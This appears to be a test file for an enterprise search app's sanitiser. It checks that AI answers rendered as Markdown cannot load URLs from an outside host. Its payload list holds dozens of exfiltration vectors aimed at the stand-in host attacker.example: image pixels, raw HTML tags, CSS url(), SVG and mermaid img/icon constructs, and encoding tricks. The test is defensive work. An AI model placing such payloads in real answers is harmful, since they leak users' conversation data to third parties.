import { expect } from 'chai'
import { readFileSync } from 'fs'
import { resolve } from 'path'
import { marked } from 'marked'
import {
  ANSWER_MEMO_BYTES,
  answerMemoStats,
  flushAnswerDelta,
  heldImageUrl,
  sanitizeAnswerDelta,
  sanitizeAnswerMarkdown,
  sanitizeAnswerMessage,
  sanitizePartialAnswerMarkdown,
  type AnswerDeltaState,
} from '../../../../src/modules/enterprise_search/utils/answer-sanitizer'
import { neutralizeMermaidSource } from '../../../../src/modules/enterprise_search/utils/mermaid-source-policy'

const OUT = 'attacker.example'
const A = `https://${OUT}`
const PIXEL = `${A}/p.gif?d=CNRY_R`

const HOST = `[/\\\\]{2}${OUT.replace('.', '\\.')}`
const ENTITIES: Record<string, string> = { colon: ':', sol: '/', bsol: '\\', quot: '"', apos: "'", amp: '&', lt: '<', gt: '>', period: '.' }
const decoded = (text: string): string =>
  text.replace(/&(#x[0-9a-f]+|#\d+|[a-z]+);/gi, (m, body: string) =>
    body[0] === '#'
      ? String.fromCodePoint(body[1].toLowerCase() === 'x' ? parseInt(body.slice(2), 16) : parseInt(body.slice(1), 10))
      : ENTITIES[body] ?? m,
  )
const URL_ATTRIBUTE = new RegExp(
  `<([a-z][\\w-]*)[^>]*?[\\s/](src|srcset|poster|background|data|href|xlink:href|action|formaction)\\s*=\\s*["']?[^"'>]*?(?:https?:)?${HOST}`,
  'gi',
)
const CSS_URL = new RegExp(`(?:style\\s*=\\s*["'][^"']*|<style[^>]*>[^<]*)url\\(\\s*['"]?(?:https?:)?${HOST}`, 'i')
const RAW_IMAGE = new RegExp(`(?<!\\\\)!\\[[^\\]\\n]*\\]\\(\\s*<?\\s*(?:https?:)?${HOST}`, 'i')
const RAW_MERMAID_ELEMENT = new RegExp(`class\\s*=\\s*["'][^"']*mermaid[^"']*["'][^>]*>[\\s\\S]*?img\\s*["']?\\s*:\\s*["']?(?:https?:)?${HOST}`, 'i')

/**
 * What a client that renders the body as Markdown with raw HTML would fetch from the outside host on its own: a
 * URL attribute other than a link's href, a CSS url() in a style, an image, or a mermaid block that still carries
 * an image, an icon or label HTML. Checked on marked's rendering and, parser-free, on the text itself.
 */
function liveOutsideUrls(markdown: string): string[] {
  const hits: string[] = []
  for (const text of [decoded(marked.parse(markdown, { async: false }) as string), decoded(markdown)]) {
    for (const m of text.matchAll(URL_ATTRIBUTE)) if (!(m[1].toLowerCase() === 'a' && m[2].toLowerCase() === 'href')) hits.push(m[0].slice(0, 80))
    if (CSS_URL.test(text)) hits.push('css url()')
    if (RAW_MERMAID_ELEMENT.test(text)) hits.push('mermaid element')
  }
  if (RAW_IMAGE.test(decoded(markdown))) hits.push('image')
  const reference = /(?<!\\)!\[[^\]\n]*\](?!\()/.test(markdown) && new RegExp(`^\\s*\\[[^\\]]+\\]:\\s*<?(?:https?:)?${HOST}`, 'im').test(markdown)
  if (reference) hits.push('reference image')
  for (const token of marked.lexer(markdown)) walkMermaid(token, hits)
  return hits
}

function walkMermaid(token: unknown, hits: string[]): void {
  const t = token as { type?: string; lang?: string; text?: string; tokens?: unknown[]; items?: unknown[] }
  if (t.type === 'code' && /^mermaid\b/i.test(t.lang ?? '')) {
    const code = t.text ?? ''
    if (neutralizeMermaidSource(code) !== code) hits.push('mermaid block not neutralised')
    if (new RegExp(`img\\s*["']?\\s*:\\s*["']?(?:https?:)?${HOST}|"icon"|<img|srcset|details\\s+\\w+\\s*:`, 'i').test(code)) hits.push('mermaid fetch construct')
  }
  for (const child of [...(t.tokens ?? []), ...(t.items ?? [])]) walkMermaid(child, hits)
}

const PAYLOADS: Array<[string, string]> = [
  ['markdown image', `Before ![x](${PIXEL}) after`],
  ['markdown image, protocol-relative', `![x](//${OUT}/p.gif)`],
  ['markdown image, backslash host', `![x](/\\${OUT}/p.gif)`],
  ['markdown image, character references', '![x](https&#x3a;//attacker.example/p.gif)'],
  ['markdown image, angle destination and title', `![x](<${PIXEL}> "t")`],
  ['reference image', `![x][r]\n\n[r]: ${PIXEL}`],
  ['shortcut reference image', `![r]\n\n[r]: ${PIXEL}`],
  ['image inside a link', `[![x](${PIXEL})](https://example.com)`],
  ['raw <img>', `<img src="${PIXEL}">`],
  ['raw <img>, no space before src', `<img/src="${PIXEL}">`],
  ['raw <img>, upper case, unquoted', `<IMG SRC=${PIXEL}>`],
  ['raw <img>, character references', '<img src="https&colon;&sol;&sol;attacker.example/p.gif">'],
  ['raw <img>, duplicate src', `<img src="/ok.png" src="${PIXEL}">`],
  ['picture beside an app image', `<picture><source srcset="${PIXEL}"><img src="/favicon.ico"></picture>`],
  ['picture beside a data: image', `<picture><source srcset="${PIXEL}"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></picture>`],
  ['picture, character references', '<picture><source srcset="https&#x3a;//attacker.example/p.gif&#x3f;d=CNRY_R"><img src="/favicon.ico"></picture>'],
  ['video and audio', `<video poster="${PIXEL}" src="${PIXEL}"></video><audio src="${PIXEL}"></audio>`],
  ['iframe, object and embed', `<iframe src="${PIXEL}"></iframe><object data="${PIXEL}"></object><embed src="${PIXEL}">`],
  ['inline style url()', `<span style="background:url(${PIXEL})">x</span>`],
  ['stylesheet', `<style>@import url(${PIXEL}); p { background: url(${PIXEL}) }</style>`],
  ['svg image', `<svg><image href="${PIXEL}"></image></svg>`],
  ['table background', `<table background="${PIXEL}"><tr><td>x</td></tr></table>`],
  ['input image', `<input type="image" src="${PIXEL}">`],
  ['link prefetch', `<link rel="prefetch" href="${PIXEL}">`],
  ['img inside an HTML block, behind a fence line', `<div>\n\`\`\`html\n<img src="${PIXEL}">\n\`\`\`\n</div>`],
  ['img after a list item whose fence never closes', `- item\n  \`\`\`\n  code\nnot indented\n<img src="${PIXEL}">`],
  ['img after a quoted fence that never closes', `> \`\`\`\n> code\n<img src="${PIXEL}">`],
  ['img in a code span inside an HTML block', `<div>\n\`<img src="${PIXEL}">\`\n</div>`],
  ['mermaid shape img', `\`\`\`mermaid\nflowchart TD\n  A@{ img: "${A}/i.png?d=CNRY_R", label: "Bands" }\n  A --> B\n\`\`\``],
  ['mermaid shape img, unquoted', `\`\`\`mermaid\nflowchart TD\n  A@{ img: ${A}/u.png?d=CNRY_R }\n\`\`\``],
  ['mermaid shape img, YAML escape', '```mermaid\nflowchart TD\n  A@{ img: "\\x68ttps://attacker.example/e.png" }\n```'],
  ['mermaid actor icon', `\`\`\`mermaid\nsequenceDiagram\n  participant A\n  properties A: {"icon": "${A}/s.png"}\n\`\`\``],
  ['mermaid actor icon, JSON escape', '```mermaid\nsequenceDiagram\n  participant A\n  properties A: {"icon": "\\u0068ttps://attacker.example/j.png"}\n```'],
  ['mermaid details', '```mermaid\nsequenceDiagram\n  participant A\n  details A: someElement\n```'],
  ['mermaid label img', `\`\`\`mermaid\nflowchart TD\n  A["<img src='${A}/l.png'>"] --> B\n\`\`\``],
  ['mermaid theme CSS', `\`\`\`mermaid\n%%{init: {"themeCSS": ".n { background: url(${A}/c.png) }"}}%%\nflowchart TD\n  A --> B\n\`\`\``],
  ['mermaid, tilde fence', `~~~mermaid\nflowchart TD\n  A@{ img: "${A}/t.png" }\n~~~`],
  ['mermaid, long fence', `\`\`\`\`\`mermaid\nflowchart TD\n  A@{ img: "${A}/lf.png" }\n\`\`\`\`\``],
  ['mermaid, capitals', `\`\`\`MERMAID\nflowchart TD\n  A@{ img: "${A}/cap.png" }\n\`\`\``],
  ['mermaid, in a list item', `1. Diagram:\n\n   \`\`\`mermaid\n   sequenceDiagram\n     properties A: {"icon": "${A}/li.png"}\n   \`\`\``],
  ['mermaid, in a quote', `> \`\`\`mermaid\n> sequenceDiagram\n>   properties A: {"icon": "${A}/q.png"}\n> \`\`\``],
  ['mermaid, never closed', `\`\`\`mermaid\nflowchart TD\n  A@{ img: "${A}/nc.png" }`],
  ['mermaid as raw HTML code', `<pre><code class="language-mermaid">flowchart TD\n  A@{ img: &quot;${A}/pre.png&quot; }</code></pre>`],
  ['split by the private-use mark', `<pic\uE003ture><source srcset="${PIXEL}"></picture>`],
  ['image split by the private-use mark', `!\uE003[x](${PIXEL})`],
  ['mermaid key split by the private-use mark', `\`\`\`mermaid\nflowchart TD\n  A@{ i\uE003mg: "${A}/pu.png" }\n\`\`\``],
  ['line breaks as carriage returns', `text\r\`\`\`mermaid\rflowchart TD\r  A@{ img: "${A}/cr.png" }\r\`\`\``],
]

describe('sanitizeAnswerMarkdown', () => {
  describe('leaves no outside URL that loads on its own', () => {
    for (const [name, payload] of PAYLOADS) {
      it(name, () => {
        // The private-use mark is what the app's client deletes before it renders.
        expect(liveOutsideUrls(payload.replace(/\uE003/g, '')), 'the text as written loads from the outside host').to.not.deep.equal([])
        const out = sanitizeAnswerMarkdown(payload)
        expect(liveOutsideUrls(out)).to.deep.equal([])
        expect(out).to.not.include('\uE003')
      })
    }
  })

  it('holds an outside image as an inert held-image the app expands on click', () => {
    expect(sanitizeAnswerMarkdown(`![chart](${PIXEL} "Q3")`)).to.equal(`![chart](${heldImageUrl(PIXEL)} "Q3")`)
    expect(heldImageUrl(PIXEL)).to.equal('held-image:https%3A%2F%2Fattacker.example%2Fp.gif%3Fd%3DCNRY_R')
    expect(sanitizeAnswerMarkdown(`<img src="${PIXEL}" alt="a" onerror="x()">`)).to.equal(`<img src="${heldImageUrl(PIXEL)}" alt="a">`)
  })

  it('makes a reference image a reference link', () => {
    expect(sanitizeAnswerMarkdown(`![x][r]\n\n[r]: ${PIXEL}`)).to.equal(`\\![x][r]\n\n[r]: ${PIXEL}`)
  })

  it('drops <picture> and <source> and keeps the image beside them', () => {
    expect(sanitizeAnswerMarkdown(`<picture><source srcset="${PIXEL}"><img src="/favicon.ico"></picture>`)).to.equal('<img src="/favicon.ico">')
  })

  it('strips the private-use inline mark before judging anything', () => {
    expect(sanitizeAnswerMarkdown('a\uE003b <@user:abc>')).to.equal('ab <@user:abc>')
  })

  describe('leaves ordinary answers as they are', () => {
    for (const text of [
      'Plain **bold** text with a [link](https://example.com/docs) and <https://example.com>.',
      'Mentions <@user:507f1f77bcf86cd799439011> and <@assistant:pipeshub> stay.',
      'A citation [1] and a marker ::artifact[report.csv]{id="a1"} stay.',
      '```html\n<img src="https://example.com/logo.png">\n<picture><source srcset="https://example.com/a.webp"></picture>\n```',
      'Use the `<picture>` element, or `<img src="https://example.com/x.png">`.',
      '<details><summary>More</summary>\n\nHidden text\n\n</details>',
      'Line one<br>line two<br/>line three',
      '| a | b |\n| - | - |\n| 1 | 2 |',
      '$$\\int_0^1 x\\,dx$$ and an image ![logo](/api/v1/knowledgeBase/stream/record/r1) and ![d](data:image/png;base64,iVBOR)',
      '```mermaid\nflowchart TD\n  A["Start<br/>here"] --> B\n  B@{ shape: "rounded", label: "End" }\n```',
      'x < y and 3 > 2, a <= b.',
      'Escaped \\![not an image](https://example.com/x.png).',
    ]) {
      it(JSON.stringify(text).slice(0, 70), () => {
        expect(sanitizeAnswerMarkdown(text)).to.equal(text)
      })
    }
  })

  it('is stable when run again', () => {
    for (const [, payload] of PAYLOADS) {
      const once = sanitizeAnswerMarkdown(payload)
      expect(sanitizeAnswerMarkdown(once), payload).to.equal(once)
    }
  })

  it('passes anything that is not text through', () => {
    expect(sanitizeAnswerMarkdown('')).to.equal('')
    expect(sanitizeAnswerMarkdown(undefined as unknown as string)).to.equal(undefined)
  })
})

describe('sanitizeAnswerDelta', () => {
  const stream = (text: string, cuts: number[]): string => {
    let state: AnswerDeltaState | undefined
    let out = ''
    let from = 0
    for (const cut of [...cuts, text.length]) {
      const step = sanitizeAnswerDelta(state, text.slice(from, cut))
      state = step.state
      out += step.out
      from = cut
    }
    return out + flushAnswerDelta(state).out
  }

  const DOCUMENT = [
    'Intro with ![x](https://attacker.example/a.png) and <img src=https://attacker.example/b.png> in it.',
    '',
    '```mermaid',
    'flowchart TD',
    '  A@{ img: "https://attacker.example/c.png" } --> B',
    '```',
    '',
    '```html',
    '<img src="https://example.com/kept.png">',
    '```',
    '',
    '- item `<picture>` here',
    '> quoted <picture><source srcset="https://attacker.example/d.png"></picture>',
    'done \\![x](y) end',
  ].join('\n')

  it('streams exactly the text the whole answer sanitises to, however it is cut', () => {
    const texts = [DOCUMENT, ...PAYLOADS.map(([, p]) => p)]
    let seed = 7
    const random = () => {
      seed = (seed * 1103515245 + 12345) % 2147483648
      return seed / 2147483648
    }
    for (const text of texts) {
      const whole = sanitizeAnswerMarkdown(text)
      expect(stream(text, []), 'one delta').to.equal(whole)
      expect(stream(text, [...text].map((_c, i) => i).slice(1)), 'one character at a time').to.equal(whole)
      for (let run = 0; run < 20; run += 1) {
        const cuts = [...new Set([...Array(4)].map(() => Math.floor(random() * text.length)))].sort((a, b) => a - b)
        expect(stream(text, cuts), `cuts ${cuts.join(',')}`).to.equal(whole)
      }
    }
  })

  it('never emits a live outside URL before the construct that carries it is complete', () => {
    let state: AnswerDeltaState | undefined
    let out = ''
    for (const chunk of ['See ![x](https://attacker', '.example/p.gif?d=CNRY_R', ') and <img src="https://attacker.example', '/q.gif">']) {
      const step = sanitizeAnswerDelta(state, chunk)
      state = step.state
      out += step.out
      expect(liveOutsideUrls(out)).to.deep.equal([])
    }
  })

  it('holds a mermaid block until it closes', () => {
    const first = sanitizeAnswerDelta(undefined, '```mermaid\nflowchart TD\n  A@{ img: "https://attacker.example/x.png"')
    expect(first.out).to.equal('')
    const second = sanitizeAnswerDelta(first.state, ' }\n```\n')
    expect(second.out).to.equal('```mermaid\nflowchart TD\n  A@{  }\n```\n')
  })
})

describe('sanitizeAnswerMessage', () => {
  it('sanitises the text of answers, their steps and the excerpt a reply quotes', () => {
    const row = {
      _id: 'm1',
      messageType: 'bot_response',
      content: `![x](${PIXEL})`,
      parts: [
        { type: 'text', content: `<img src="${PIXEL}">` },
        { type: 'sub_agent', parts: [{ type: 'text', content: `![y](${PIXEL})` }] },
        { type: 'reasoning', content: 'thinking about <img src=x>' },
      ],
    }
    const out = sanitizeAnswerMessage(row)
    expect(liveOutsideUrls(out.content)).to.deep.equal([])
    expect(liveOutsideUrls(out.parts[0].content as string)).to.deep.equal([])
    expect(liveOutsideUrls((out.parts[1] as { parts: Array<{ content: string }> }).parts[0].content)).to.deep.equal([])
    expect(out.parts[2]).to.equal(row.parts[2])
    expect(row.content).to.equal(`![x](${PIXEL})`)

    const reply = sanitizeAnswerMessage({ messageType: 'user_query', content: `![q](${PIXEL})`, replyTo: { messageId: 'm1', excerpt: `![e](${PIXEL})` } })
    expect(reply.content).to.equal(`![q](${PIXEL})`)
    expect(liveOutsideUrls(reply.replyTo.excerpt)).to.deep.equal([])
  })

  it('covers error rows and answers shared into a chat, and returns an unchanged row as it was', () => {
    for (const messageType of ['error', 'shared_answer']) {
      expect(liveOutsideUrls(sanitizeAnswerMessage({ messageType, content: `![x](${PIXEL})` }).content)).to.deep.equal([])
    }
    const plain = { messageType: 'bot_response', content: 'plain' }
    expect(sanitizeAnswerMessage(plain)).to.equal(plain)
  })
})

describe('mermaid source policy', () => {
  it('is the same file the app renders with', () => {
    const here = resolve(__dirname, '../../../../src/modules/enterprise_search/utils/mermaid-source-policy.ts')
    const app = resolve(__dirname, '../../../../../../../frontend/lib/utils/mermaid-source-policy.ts')
    expect(readFileSync(here, 'utf8')).to.equal(readFileSync(app, 'utf8'))
  })
})

describe('what the sanitiser keeps of the answers it made stays within its budget', () => {
  // About 150,000 characters of code: a long answer that needs a pass (a fence).
  const code = '```ts\n' + 'const value = compute(input) // a line of code in the answer\n'.repeat(2_500) + '```\n'

  it('holds at most its budget after 1,000 large answers', () => {
    for (let i = 0; i < 1_000; i += 1) sanitizeAnswerMarkdown(`answer ${i}\n${code}`)
    const { bytes, entries } = answerMemoStats()
    expect(bytes).to.be.at.most(ANSWER_MEMO_BYTES)
    expect(entries).to.be.greaterThan(0)
  })

  it('counts two bytes a character for text that is not Latin-1, as it is kept', () => {
    const cjk = '```\n' + '共有チャットの回答はここにあります。'.repeat(5_000) + '\n```\n'
    for (let i = 0; i < 300; i += 1) sanitizeAnswerMarkdown(`回答 ${i}\n${cjk}`)
    const { bytes, entries } = answerMemoStats()
    expect(bytes).to.be.at.most(ANSWER_MEMO_BYTES)
    // Two answers of about 90,000 characters each, input and output, two bytes a character: 16 MB holds at most 23.
    expect(entries).to.be.at.most(Math.floor(ANSWER_MEMO_BYTES / (4 * cjk.length)) + 1)
  })

  it('a still-repeated answer is kept while older ones go', () => {
    const kept = `kept\n${code}`
    const first = sanitizeAnswerMarkdown(kept)
    for (let i = 0; i < 200; i += 1) {
      sanitizeAnswerMarkdown(`other ${i}\n${code}`)
      expect(sanitizeAnswerMarkdown(kept)).to.equal(first)
    }
    expect(answerMemoStats().bytes).to.be.at.most(ANSWER_MEMO_BYTES)
  })

  it("keeps none of a live answer's partial texts, and reads them exactly as the whole answer's", () => {
    const before = answerMemoStats()
    for (let len = 200; len <= 20_000; len += 200) {
      const partial = `streamed\n${code.slice(0, len)}`
      expect(sanitizePartialAnswerMarkdown(partial)).to.equal(sanitizeAnswerMarkdown(partial))
    }
    // Only the whole-answer calls above were kept; the partial ones added nothing.
    const after = answerMemoStats()
    expect(after.entries - before.entries).to.be.at.most(100)
    const partialOnly = answerMemoStats()
    for (let len = 250; len <= 20_000; len += 250) sanitizePartialAnswerMarkdown(`only partial\n${code.slice(0, len)}`)
    expect(answerMemoStats()).to.deep.equal(partialOnly)
  })
})
